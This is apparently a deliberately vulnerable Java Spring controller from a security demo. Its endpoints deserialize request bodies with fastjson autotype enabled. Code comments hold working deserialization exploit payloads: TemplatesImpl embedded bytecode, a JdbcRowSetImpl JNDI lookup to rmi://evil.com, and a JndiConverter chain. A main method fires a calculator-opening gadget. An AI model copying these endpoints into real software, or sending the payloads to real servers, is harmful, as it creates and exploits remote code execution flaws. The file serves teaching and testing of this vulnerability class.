package com.safe.demo.hole.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.safe.demo.hole.utils.WebUtil;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

@RestController
@RequestMapping("/unserialize")
public class ReflectHole {


    /**
     * {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIUE9DLmphdmEMAAgACQcAIQwAIgAjAQAhb3BlbiAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAkACUBABFmeGxoL2Zhc3Rqc29uL1BPQwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAATAAQAFAANABUADAAAAAQAAQANAAEADgAPAAEACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAZAAEADgAQAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAeAAwAAAAEAAEAEQAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAAhAAgAIgAMAAAABAABABQAAQAVAAAAAgAW"],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
     */
    @PostMapping("/fastjson")
    public JSONObject reflectHole24(HttpServletRequest request) throws IOException {
        String data = WebUtil.getRequestBody(request);
        return JSON.parseObject(data, Feature.SupportNonPublicField);
    }


    /**
     * {
     *     "a":{
     *         "@type":"java.lang.Class",
     *         "val":"com.sun.rowset.JdbcRowSetImpl"
     *     },
     *     "b":{
     *         "@type":"com.sun.rowset.JdbcRowSetImpl",
     *         "dataSourceName":"rmi://evil.com:9999/Exploit",
     *         "autoCommit":true
     *     }
     * }
     */
    @PostMapping("/fastjson2")
    public JSONObject reflectHole47(HttpServletRequest request) throws IOException {
        String data = WebUtil.getRequestBody(request);
        return JSON.parseObject(data);
    }

    /**
     * fastjson1.2.68
     *
     * {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/exploit"}"
     *
     */
    @PostMapping("/fastjson3")
    public JSONObject reflectHole68(HttpServletRequest request) throws IOException {
        String data = WebUtil.getRequestBody(request);
        return JSON.parseObject(data);
    }
    public static void main(String[] args) {
        String payload21 = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.p.Test1\",\"cmd\":\"open /Applications/Calculator.app\"}";
        JSON.parse(payload21);
    }
}
